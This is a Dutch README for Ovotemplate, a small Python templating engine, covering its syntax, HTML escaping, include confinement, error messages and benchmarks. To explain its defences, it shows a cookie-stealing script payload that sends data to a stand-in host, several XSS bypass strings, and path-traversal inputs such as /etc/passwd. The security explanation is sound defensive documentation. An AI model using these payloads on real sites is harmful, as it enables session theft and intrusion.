# Ovotemplate

[![tests](https://github.com/motoom/ovotemplate/actions/workflows/tests.yml/badge.svg)](https://github.com/motoom/ovotemplate/actions/workflows/tests.yml)

Een templating-engine van één bestand, zonder dependencies, met een syntaxis
die in één tabel past.

```python
>>> from ovotemplate import Ovotemplate
>>> Ovotemplate("Hallo {=naam}!").render({"naam": "Jan"})
'Hallo Jan!'
```

Geen `{% for %}` / `{% endfor %}`, geen environments, geen loader-configuratie.
Eén metateken achter de accolade zegt wat er gebeurt, en de sluitaccolade zegt
waar het ophoudt. Dat is de hele taal.

## Waarom

De meeste templating-engines zijn gebouwd voor mensen die een templating-taal
wíllen. Deze is gebouwd voor het tegenovergestelde geval: je hebt HTML, je hebt
een dict, en je wilt er zo min mogelijk tussen. Het hele pakket is `ovotemplate.py`
— 1275 regels, inclusief 17 unittests en een benchmark. De imports zijn `os`,
`pprint`, `re`, `html`, `unittest`, `functools` en `datetime`. Meer niet.

## De hele syntaxis

| Constructie | Betekenis | Voorbeeld | Resultaat |
|---|---|---|---|
| `{=naam}` | substitutie | `Hallo {=naam}!` | `Hallo Jan!` |
| `{=!naam}` | substitutie zonder escaping | `{=!html}` | `<b>vet</b>` |
| `{?naam …}` | als waar | `{?lid Welkom terug}` | `Welkom terug` |
| `{!naam …}` | als niet waar | `{!lid Word lid!}` | `Word lid!` |
| `{#naam …}` | herhaal | `{#kleuren {=naam}}` | `roodgroenblauw` |
| `{#naam:a:b …}` | herhaal een deel | `{#kleuren:0:2 {=naam}}` | `roodgroen` |
| `{/naam …}` | scheiding, valt weg na de laatste | `{#kleuren {=naam}{/s , }}` | `rood, groen, blauw` |
| `{:naam …}` | leg vast in een variabele | `{:btw 21}Tarief: {=btw}%` | `Tarief: 21%` |
| `{\|naam …}` | als de lijst precies één item heeft | `{\|items Eén stuk}` | `Eén stuk` |
| `{+naam …}` | als de lijst er meer dan één heeft | `{+items Meerdere}` | `Meerdere` |
| `{$file pad}` | voeg een template in, mét expansie | `{$file deel.tpl}` | `Het Universum is 42 jaar oud.` |
| `{$verb pad}` | voeg een bestand in, letterlijk | `{$verb deel.tpl}` | `Het Universum is {=age} jaar oud.` |

Bereiken volgen Python's slice-semantiek, inclusief negatieve grenzen en
clamping: `{#kleuren:-2:x …}` geeft de laatste twee, `{#kleuren:0:99 …}` geeft
gewoon alles. Een `{/scheiding}` binnen een bereik stopt aan het eind van het
bereik, niet aan het eind van de lijst.

Zitten er accolades in je uitvoer — JavaScript, CSS — dan kun je de engine op
guillemets zetten. Dát is waar ze voor bedoeld zijn: met `{}` als delimiter eet
de lexer je JavaScript op.

```python
Ovotemplate(bron, usebraces=False)
```

```html
<script>
function groet(naam) {
    if (naam) { alert("Hallo " + naam); }
}
groet("«=naam»");
</script>
```

Met accolades sneuvelt dat op regel 2, kolom 22 — bij de `{` van `function
groet(naam) {`. Met guillemets zijn die accolades gewone tekst en is alleen
`«=naam»` een substitutie.

Let wel op de escaping-val: entiteiten worden binnen een `<script>`-element níét
gedecodeerd, dus `«=v»` met een aanhalingsteken erin levert letterlijk `&quot;`
op in je JavaScript. Codeer zo'n waarde in Python en laat hem ongeëscaped door:

```python
render({"v": json.dumps(waarde)})     # in de template: var x = «=!v»;
```

## Wat je als context mag meegeven

Alles wat een waarde bij een naam kan vinden:

```python
tem = Ovotemplate("{=naam}")

tem.render({"naam": "Mary"})                      # dict
tem.render(Entry(naam="Mary"))                    # namedtuple
tem.render(Bunch(naam="Mary"))                    # bunch.Bunch
tem.render(rechthoek)                             # elk object
```

Berekende `@property`-members tellen mee. Dat is met opzet: presentatielogica
hoort in je model, niet in je template.

```python
class Rectangle(Bunch):
    @property
    def area(self):
        return self.width * self.height

    @property
    def shape(self):
        if self.width == self.height:
            return "square"
        return "%d by %d rectangle" % (self.width, self.height)
```

```python
>>> Ovotemplate("{=shape}, oppervlak {=area}").render(Rectangle(width=3, height=4))
'3 by 4 rectangle, oppervlak 12'
```

Gewone methodes komen er níét doorheen. `{=items}` op een dict levert geen
`<built-in method items>` op, maar niets — of een foutmelding, zie hieronder.

## Escaping

Escaping vervangt vijf tekens die in HTML een betekenis hebben door hun entiteit:

```
'&' -> '&amp;'    '<' -> '&lt;'    '>' -> '&gt;'    '"' -> '&quot;'    "'" -> '&#x27;'
```

Dat gebeurt alleen op waarden die via `{=naam}` uit je context komen, nooit op de
letterlijke tekst van je template. De `&euro;` die je zelf typt blijft `&euro;`.

### Waarom

Een browser kan niet zien welke `<` jij hebt geschreven en welke uit je database
kwam. Alles wat in de HTML-stroom terechtkomt is markup:

```
autoescape uit  <p>opmerking: <script>fetch("http://kwaad.nl?c="+document.cookie)</script></p>
autoescape aan  <p>opmerking: &lt;script&gt;fetch(&quot;...&quot;)&lt;/script&gt;</p>
```

Zonder escaping heeft degene die dat opmerkingenveld invulde code op jouw pagina
laten draaien, met de cookies van je bezoekers erbij. Mét escaping ziet de
bezoeker gewoon de letterlijke tekst staan — entiteiten worden bij het tónen weer
gedecodeerd, dus visueel verandert er niets.

De ampersand is het subtielere geval, en gaat niet over veiligheid maar over
correctheid. Een browser leest een losse `&` als het begin van een entiteit:

```
?p=1&copy=2     wordt gelezen als  ?p=1©=2
?p=1&sect=3     wordt gelezen als  ?p=1§=3
?p=1&pagina=2   gaat toevallig goed
```

Een URL met `&copy=` in een `href` is dus stuk zonder escaping. Met `&amp;` klopt
het altijd, ongeacht wat erachter staat.

### Eromheen, als je markup wél wilt doorlaten

```python
Ovotemplate("{=!v}").render({"v": markup})     # deze ene substitutie
Ovotemplate("{=v}").render({"v": Raw(markup)}) # deze ene waarde, overal
ovotemplate.autoescape = False                 # helemaal uit
```

Een `{:setter}` hoef je niet apart te regelen: die legt zijn opgevangen tekst
vast als `Raw`, dus `{:x <b>{=v}</b>}{=x}` escapet alleen de `{=v}` daarbinnen en
laat de `<b>` die jij schreef met rust.

## Wat escaping niet doet

Ovotemplate kent één escaping-regel en weet niet in wat voor context een
substitutie terechtkomt. Dat is genoeg voor tekstinhoud en voor attribuutwaarden
tussen aanhalingstekens:

```html
<p>{=v}</p>             <!-- veilig -->
<div class="{=v}">      <!-- veilig -->
```

Maar niet voor deze vier. Allemaal gemeten, allemaal met escaping aan:

```html
<div class={=v}>              v = 'a onmouseover=alert(1)'
                              -> <div class=a onmouseover=alert(1)>

<a href="{=v}">               v = 'javascript:alert(1)'
                              -> <a href="javascript:alert(1)">

<script>var x = "{=v}";       v = '\'
                              -> var x = "\";   (breekt uit de string)

<div style="{=v}">            v = 'x:expression(alert(1))'
                              -> ongewijzigd doorgegeven
```

Geen van die vier bevat een van de vijf tekens die geëscaped worden. Zet
attribuutwaarden dus altijd tussen aanhalingstekens, en behandel URL's, `<script>`
en `<style>` als plekken waar je contextdata zelf moet valideren.

Twee dingen daarnaast, die los van escaping staan:

- `{$file}` en `{$verb}` openen standaard elk pad dat uit de template rolt,
  inclusief een pad dat via `{=naam}` uit je context komt. Zet `templateroot`
  zodra dat kan gebeuren — zie hieronder.

Foutmeldingen zelf zijn wél dicht: `errorspan()` escapet zijn boodschap, dus een
templatenaam of variabelenaam die uit een verzoek komt kan er geen markup in
smokkelen.

### Includes opsluiten

`templateroot` sluit `{$file}` en `{$verb}` op in één map:

```python
ovotemplate.templateroot = "/srv/app/templates"   # of: OVOTEMPLATE_ROOT=...
```

Een relatief pad wordt dan tegen die root opgelost, en alles wat er buiten
uitkomt gaat de deur uit — of dat nu via `..`, een absoluut pad of een symlink
gebeurt, want er wordt op `realpath()` vergeleken:

```
{$file nl/deel.tpl}                      ->  Universum: 42 jaar
{$verb /srv/app/templates/nl/deel.tpl}   ->  Universum: {=age} jaar
{$verb ../geheim.txt}                    ->  Template error ... outside the template root
{$verb nl/../../geheim.txt}              ->  Template error ... outside the template root
{$verb /etc/passwd}                      ->  Template error ... outside the template root
{$verb sluipweg.txt}                     ->  Template error ... outside the template root
{$verb {=pad}}  met pad='../geheim.txt'  ->  Template error ... outside the template root
```

Standaard staat `templateroot` op `None`, wat de oude onbeperkte werking geeft.
Zet je hem op `"."`, dan blijven bestaande templates die `{$file templates/nl/x.tpl}`
schrijven gewoon werken en kun je er alleen niet meer je projectmap uit.

Met `exceptionless = False` krijg je een `ForbiddenPath` in plaats van een span.

Kortom: escaping sluit de meest voorkomende deur — data die als tekst in HTML
belandt — maar maakt de engine niet vanzelf veilig. Contextbewuste escaping,
zoals Jinja2 die met zijn autoescape-per-context ook niet heeft, zou daarvoor
nodig zijn.

## Onbekende variabelen

Standaard hetzelfde als Jinja2's `Undefined`: een naam die er niet is, rendert
als niets, is onwaar in een conditie, en levert een lege herhaling op. Dat houdt
optionele velden uit je template.

```python
>>> Ovotemplate("Hallo {=ontbreekt}!").render({})
'Hallo !'
```

Prettig in productie, minder prettig als je een typefout maakt. Daarom is er de
tegenhanger van `StrictUndefined`:

```python
ovotemplate.strictvars = True     # of: OVOTEMPLATE_STRICT=1
```

Condities blijven in beide standen soepel: `{!naam …}` blijft "als dit niet
gezet is" betekenen, want er is geen aparte `is defined`-test.

## Foutmeldingen die zeggen waar

Elke token, elke literal en elke container onthoudt zijn regel en kolom. Een
fout wijst dus naar de plek waar je hem geschreven hebt, en niet naar "ergens":

```
Template error in Sub at offerte.tpl, line 2, column 8: unknown variable "typo"
Template error in Rep at offerte.tpl, line 3, column 3: unknown variable "lijstt"
Template error at offerte.tpl, line 2, column 3: '{' without a following valid metachar
Template error: unbalanced '{' at offerte.tpl, line 2, column 6
```

Ingesloten templates noemen hun eigen bestandsnaam, niet die van de template die
ze insluit.

Standaard verschijnt zo'n melding als een rode `<span>` in de uitvoer, zodat één
kapotte variabele niet de hele pagina meesleurt. Wil je liever een exception:

```python
ovotemplate.exceptionless = False
```

Diezelfde posities maken `pprint()` bruikbaar als debug-gereedschap:

```python
>>> Ovotemplate("{?korting {=pct}%}", "offerte.tpl").pprint()
Container: [Cond korting @ offerte.tpl, line 1, column 1: [Lit @ offerte.tpl,
line 1, column 11: [''], Sub pct @ offerte.tpl, line 1, column 11: [], Lit @
offerte.tpl, line 1, column 17: ['%']]]
```

(Hier afgebroken om te passen; `pprint` zet het op één regel.)

## Instellingen

| Vlag | Standaard | Omgevingsvariabele | Doet |
|---|---|---|---|
| `autoescape` | `True` | `OVOTEMPLATE_AUTOESCAPE` | HTML-escaping van substituties |
| `strictvars` | `False` | `OVOTEMPLATE_STRICT` | onbekende variabelen melden |
| `templateroot` | `None` | `OVOTEMPLATE_ROOT` | sluit `{$file}`/`{$verb}` op in één map |
| `exceptionless` | `True` | — | foutspan in plaats van exception |
| `verbose` | `False` | — | vertelt luidruchtig wat hij doet |

Toekennen in code wint altijd van de omgeving:

```python
import ovotemplate
ovotemplate.strictvars = settings.DEBUG
```

## Installeren

```
pip install ovotemplate
```

Of gewoon `ovotemplate.py` naast je code zetten — het importeert niets buiten de
standard library. `bunch.py` hoort bij de testsuite en zit niet in het pakket;
zonder dat bestand slaat de suite drie tests over.

## Gebruik

```python
from ovotemplate import Ovotemplate

Ovotemplate("Hallo {=naam}!").render({"naam": "Jan"})       # uit een string
Ovotemplate().fromfile("hallo.tpl").render(context)         # uit een bestand
```

Er is ook een `acquire(context, pathelems)` die een template uit `templates/`
haalt en meteen rendert.

## Tests

```
$ python3 -m unittest ovotemplate -v
Ran 17 tests in 0.003s
OK
```

`bunch.py` hoort erbij: de tests gebruiken het voor de context-varianten.

## Snelheid

De benchmark in `test_performance()` beweert dat Ovotemplate ruim tweemaal zo
snel is als Jinja2. Die meting is oud. Op Python 3.14 met Jinja2 3.1.6, 64.000
secties, 3,35 MB uitvoer:

| | escaping uit | escaping aan |
|---|---|---|
| Ovotemplate | 0,069 s | 0,102 s |
| Jinja2 | 0,054 s | 0,097 s |

Bij een eerlijke vergelijking — escaping aan beide kanten aan — is het
tegenwoordig vrijwel gelijkspel. Jinja2 compileert templates naar Python-bytecode
en is daar de afgelopen jaren hard aan blijven werken. Ovotemplate loopt een boom
af en is daarmee ongeveer 10% trager.

Dat is geen reden om de een of de ander te kiezen. Kies Ovotemplate als je één
bestand wilt dat je helemaal kunt lezen; kies Jinja2 als je filters, overerving,
macro's en een ecosysteem wilt.

## Licentie

MIT — zie [LICENSE](LICENSE).
